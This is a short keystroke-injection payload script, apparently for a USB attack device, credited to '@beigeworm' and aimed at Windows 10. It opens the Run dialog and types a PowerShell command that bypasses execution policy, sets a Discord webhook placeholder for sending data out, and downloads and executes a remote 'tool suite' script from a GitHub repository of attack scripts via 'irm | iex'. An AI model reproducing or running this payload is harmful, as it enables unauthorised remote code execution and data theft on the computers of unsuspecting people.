// Title: beigeworm's Tool Suite GUI
// Author: @beigeworm
// Description: This script Starts a GUI with a huge set of tools.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Beigeworms-Tool-Suite/main.ps1 | iex");
delay(500);
press("ENTER");

